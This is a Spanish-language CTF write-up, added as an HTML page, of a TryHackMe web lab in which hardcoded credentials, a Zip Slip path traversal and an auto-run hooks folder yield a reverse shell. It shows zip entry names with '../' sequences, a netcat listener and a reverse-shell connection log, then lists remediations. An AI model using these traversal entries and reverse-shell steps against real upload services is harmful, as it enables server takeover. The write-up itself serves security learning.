@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 10 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Web / Arbitrary File Write / RCE</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">Critical</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-06</div>
+      </div>
+    </div>
+
+    <h1>The Hollow Shell — Zip Slip en subida de "shells" y RCE vía automation hooks</h1>
+    <p class="dek">Se explotó un panel de gestión de "shells" decorativas del resort que permitía subir archivos .zip sin validar rutas internas (Zip Slip). Esto permitió escribir un payload malicioso directamente en el directorio de <code>hooks/</code>, donde el "theme worker" del sistema lo ejecutaba automáticamente, otorgando ejecución remota de código y una shell interactiva en el servidor.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El reto "The Hollow Shell" (Día 10, categoría Web, dificultad Medium) presentaba el siguiente briefing: una aplicación del resort permite a los huéspedes personalizar la pantalla en la habitación subiendo una "shell" — un souvenir digital tomado de la playa — que luego el equipo de staff publica a través del portal Shoreline Display. Una vez que la shell queda "held to the room's ear", se reproduce en las tablets de la habitación.</p>
+    <pre><code># Briefing del reto
+Category: Web
+Difficulty: Medium
+Room Access: http://MACHINE_IP</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-briefing.png" alt="Briefing del reto The Hollow Shell en TryHackMe">
+      <figcaption>Fig. 1 — Briefing del reto "The Hollow Shell" en TryHackMe (90 pts, Web, Medium), con la IP de la máquina objetivo.</figcaption>
+    </figure>
+
+    <p>Se inició con un escaneo de puertos sobre la IP asignada:</p>
+    <pre><code>nmap -p- --min-rate=1000 -T4 10.67.153.21
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp</code></pre>
+    <p>El puerto 5000 resultó ser donde realmente corría la aplicación web, más allá de que nmap lo identificara genéricamente como <code>upnp</code>.</p>
+
+    <figure>
+      <img src="../assets/img/Day10-nmap-scan.png" alt="Escaneo nmap completo mostrando el puerto 5000 abierto">
+      <figcaption>Fig. 2 — Escaneo nmap completo mostrando el puerto 5000 abierto (además del 22/SSH), donde realmente corre la aplicación web.</figcaption>
+    </figure>
+
+    <p>Al acceder a <code>http://10.67.153.21:5000</code> se presentó la página de login del portal <strong>Byte Lotus — Shoreline Display</strong>, un panel de "staff sign-in" restringido a personal autorizado.</p>
+
+    <figure>
+      <img src="../assets/img/Day10-login-page.png" alt="Página de login Byte Lotus Staff sign-in">
+      <figcaption>Fig. 3 — Página de login "Byte Lotus - Staff sign-in" del portal Shoreline Display, encontrada en el puerto 5000.</figcaption>
+    </figure>
+
+    <p>Como paso estándar de reconocimiento, se inspeccionó el código fuente de la página de login antes de intentar cualquier ataque de fuerza bruta o inyección. El HTML contenía un comentario dejado por el equipo de IT con credenciales de arranque:</p>
+    <pre><code># view-source de /login
+
+&lt;!--
+  Byte Lotus // internal display-manager portal
+  New on the floor team? IT seeds every property with the same
+  starter login until you set your own:
+    user: concierge
+    pass: StayNoticed2024!
+  (rotate it from Settings on first sign-in — most people forget)
+--&gt;</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-source-creds.png" alt="Código fuente HTML con credenciales hardcodeadas en comentario">
+      <figcaption>Fig. 4 — Código fuente HTML de la página de login, revelando credenciales de staff hardcodeadas en un comentario (concierge / StayNoticed2024!).</figcaption>
+    </figure>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>Con las credenciales <code>concierge / StayNoticed2024!</code> se obtuvo acceso al panel autenticado <strong>Room Service / Shoreline Display</strong>. El panel permitía subir "shells" en formato <code>.zip</code> — paquetes souvenir que debían contener un manifiesto <code>shell.json</code> listando sus assets (imágenes, hojas de estilo). El propio panel advertía que las shells podían incluir <strong>"automation hooks"</strong> opcionales, aplicados automáticamente por un "theme worker" poco después de que la shell llegara a la costa.</p>
+
+    <figure>
+      <img src="../assets/img/Day10-upload-panel.png" alt="Panel autenticado con formulario de subida de shells">
+      <figcaption>Fig. 5 — Panel autenticado, mostrando el formulario de subida de "shells" (.zip) y la mención a "automation hooks".</figcaption>
+    </figure>
+
+    <p>Se identificaron dos fallas encadenables:</p>
+    <ul>
+      <li><strong>Zip Slip (path traversal en descompresión):</strong> el backend extraía el contenido del .zip sin sanear las rutas internas de cada entrada. Un archivo dentro del zip con un nombre como <code>../../ruta/archivo</code> lograba escribirse fuera del directorio de destino esperado (<code>shells/&lt;id&gt;/</code>).</li>
+      <li><strong>Ejecución automática de hooks sin sandboxing:</strong> el "theme worker" mencionado en la UI procesaba cualquier contenido colocado en un directorio <code>hooks/</code>, ejecutándolo sin restricciones. Si un atacante lograba escribir un archivo Python allí mediante Zip Slip, el worker lo ejecutaría como si fuera un hook legítimo.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> la validación de tipo de archivo (<code>png jpg gif svg css json</code>) solo se aplicaba a la <em>extensión</em> del nombre del asset, no a la ruta completa dentro del zip. Esto permitió confirmar rápidamente que el filtro era superficial: un archivo con extensión no permitida (<code>evil.txt</code>) era rechazado, pero el filtro no validaba secuencias <code>../</code> en el path.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Confirmación de subida básica.</strong> Se subió un .zip de prueba simple para entender el comportamiento normal del endpoint:</p>
+    <pre><code>Shell 'test shell' brought ashore. Stored at shells/59e244625289/ and held to the room's ear.</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-upload-confirm.png" alt="Confirmación de subida exitosa mostrando la ruta shells/id/">
+      <figcaption>Fig. 6 — Confirmación exitosa de subida de un archivo .zip de prueba, mostrando la ruta pública donde se almacena (shells/&lt;id&gt;/).</figcaption>
+    </figure>
+
+    <p><strong>Paso 2 — Prueba de validación de assets.</strong> Se intentó incluir un archivo con extensión no permitida dentro del zip:</p>
+    <pre><code>Shell rejected: asset type not allowed: evil.txt</code></pre>
+    <p>Esto confirmó que la validación ocurría a nivel de extensión de archivo, sin considerar la ruta completa del entry dentro del zip — el vector de entrada para Zip Slip.</p>
+
+    <figure>
+      <img src="../assets/img/Day10-asset-rejected.png" alt="Rechazo de asset con extensión no permitida">
+      <figcaption>Fig. 7 — Rechazo de un asset con extensión no permitida (evil.txt), confirmando que la validación se basa en el nombre/extensión del archivo.</figcaption>
+    </figure>
+
+    <p><strong>Paso 3 — Confirmación de Zip Slip.</strong> Se construyó un .zip con una entrada cuyo nombre contenía secuencias <code>../</code>, apuntando a una ruta fuera del directorio de destino (<code>shells/&lt;id&gt;/</code>), específicamente hacia <code>static/</code>:</p>
+    <pre><code># Estructura del zip malicioso (nombres de entry manipulados)
+shell.json
+../../static/zipslip_proof.json</code></pre>
+    <p>Tras subir el zip, se accedió directamente a la ruta de destino fuera del sandbox esperado:</p>
+    <pre><code>GET http://10.67.153.21:5000/static/zipslip_proof.json
+
+{
+  "proof": "zip slip write confirmed"
+}</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-zipslip-proof.png" alt="Verificación de archivo escrito fuera del directorio esperado">
+      <figcaption>Fig. 8 — Verificación en el navegador de un archivo escrito fuera del directorio esperado (/static/zipslip_proof.json), confirmando la vulnerabilidad Zip Slip.</figcaption>
+    </figure>
+
+    <p><strong>Paso 4 — Delimitación de la raíz del proyecto.</strong> Se probó la profundidad de <code>../</code> necesaria para alcanzar distintos directorios. Con dos niveles (<code>../../</code>) la escritura fue exitosa; al intentar un tercer nivel el servidor devolvió un error 500, lo que permitió ubicar la raíz del proyecto en el filesystem:</p>
+    <pre><code>500 Internal Server Error
+The server encountered an internal error and was unable to complete your request.</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-depth-probe.png" alt="Error 500 al intentar escribir 3 niveles arriba">
+      <figcaption>Fig. 9 — Prueba de profundidad de directorios: escritura exitosa 2 niveles arriba (../../) y error 500 al intentar 3 niveles, delimitando la raíz del proyecto.</figcaption>
+    </figure>
+
+    <p><strong>Paso 5 — RCE vía automation hook.</strong> Con la ruta de <code>hooks/</code> identificada relativa a la raíz del proyecto, se construyó un .zip con una entrada que apuntaba a esa carpeta, conteniendo un payload Python de reverse shell. Se configuró un listener y se subió la shell maliciosa:</p>
+    <pre><code># Listener en la máquina atacante
+nc -lvnp 4444
+
+# El zip incluía una entrada tipo:
+../../hooks/payload.py
+
+# Contenido de payload.py: reverse shell estándar en Python
+# ejecutado automáticamente por el "theme worker" al detectar
+# el nuevo archivo en hooks/</code></pre>
+    <p>Tras la subida, el "theme worker" procesó el hook y ejecutó el payload, estableciendo conexión con el listener:</p>
+    <pre><code>listening on [any] 4444 ...
+connect to [192.168.136.224] from (UNKNOWN) [10.67.153.21] 37106
+/bin/sh: 0: can't access tty; job control turned off
+$</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-reverse-shell.png" alt="Shell reversa recibida en el listener netcat">
+      <figcaption>Fig. 10 — Conexión de shell reversa recibida en el listener netcat tras subir un payload Python en la carpeta hooks/, tal como espera el "theme worker".</figcaption>
+    </figure>
+
+    <p><strong>Paso 6 — Obtención de la flag.</strong> Con acceso a shell como el usuario <code>roomservice</code>, se localizó la flag del reto:</p>
+    <pre><code>roomservice@tryhackme-2404:/var/www/conch$ cat /home/roomservice/flag.txt
+THM{z1p_slip3d_1nt0_a_sh3ll}</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day10-flag.png" alt="Shell interactiva mostrando la flag final">
+      <figcaption>Fig. 11 — Shell interactiva en el servidor comprometido mostrando la flag final en /home/roomservice/flag.txt.</figcaption>
+    </figure>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena de vulnerabilidades resultó en compromiso remoto completo del servidor:</p>
+    <ul>
+      <li><strong>Acceso autenticado inicial</strong> mediante credenciales de staff hardcodeadas en un comentario HTML de producción.</li>
+      <li><strong>Escritura arbitraria de archivos</strong> en el filesystem del servidor mediante Zip Slip, sin restricción de directorio destino.</li>
+      <li><strong>Ejecución remota de código</strong> aprovechando un mecanismo de automatización ("theme worker" + <code>hooks/</code>) que confiaba ciegamente en cualquier archivo colocado en esa carpeta.</li>
+      <li><strong>Shell interactiva</strong> como el usuario de servicio <code>roomservice</code>, con acceso al filesystem de la aplicación en <code>/var/www/conch</code>.</li>
+    </ul>
+    <p>El impacto es <em>critical</em>: la combinación de un filtro de validación superficial (solo extensión, no ruta) con un mecanismo de automatización sin sandboxing convierte una función de "subir souvenirs decorativos" en un vector directo de ejecución remota de código, sin necesidad de explotar ningún componente adicional del sistema operativo.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Sanear rutas al descomprimir archivos .zip:</strong> validar que cada entry, tras resolver rutas relativas, permanezca dentro del directorio de destino previsto. Rechazar cualquier entry cuyo path normalizado contenga <code>../</code> o resuelva fuera del directorio base.</li>
+      <li><strong>Usar librerías de extracción seguras:</strong> preferir funciones que ya mitiguen Zip Slip (por ejemplo, validando <code>os.path.commonpath</code> entre el destino resuelto y el directorio base antes de escribir cada archivo).</li>
+      <li><strong>Eliminar o aislar el mecanismo de "automation hooks":</strong> si un componente ejecuta automáticamente archivos encontrados en un directorio, ese directorio nunca debe ser alcanzable desde una ruta controlada por el usuario. Ejecutar hooks en un entorno sandboxeado (contenedor, usuario sin privilegios, sin acceso a red saliente).</li>
+      <li><strong>Eliminar credenciales hardcodeadas del código fuente:</strong> nunca dejar credenciales de arranque en comentarios HTML de producción, ni siquiera como "credenciales temporales para rotar después".</li>
+      <li><strong>Validar contenido real de archivos, no solo extensión:</strong> los tipos de asset permitidos deberían verificarse por contenido (magic bytes) y limitarse estrictamente a lo necesario, además de validar la estructura completa del zip antes de extraer nada.</li>
+      <li><strong>Principio de mínimo privilegio para el servicio:</strong> el proceso que corre la aplicación web (<code>roomservice</code>) no debería tener permisos de escritura fuera de su directorio de trabajo ni sobre carpetas usadas por procesos de automatización.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto es un caso de manual de Zip Slip: una vulnerabilidad conocida desde hace años pero que sigue apareciendo porque las validaciones de subida de archivos suelen enfocarse en el <em>tipo</em> de contenido y no en la <em>ruta</em> de destino. Validar la extensión de un archivo (<code>png</code>, <code>jpg</code>, <code>json</code>) no dice nada sobre si el nombre de esa entrada dentro del zip intenta escapar del directorio esperado.</p>
+    <p>El segundo hallazgo clave es que la severidad real no vino del Zip Slip en sí mismo, sino de la combinación con un mecanismo de automatización preexistente en el sistema (el "theme worker" + <code>hooks/</code>). Un simple path traversal de escritura de archivos es de por sí serio, pero cuando existe un componente del sistema dispuesto a <em>ejecutar</em> cualquier cosa que aparezca en cierto directorio, la escritura arbitraria se convierte automáticamente en RCE. La lección: al evaluar el impacto de un file write arbitrario, siempre vale la pena mapear qué otros procesos del sistema leen o ejecutan contenido de forma automática — ahí suele estar el salto de severidad.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
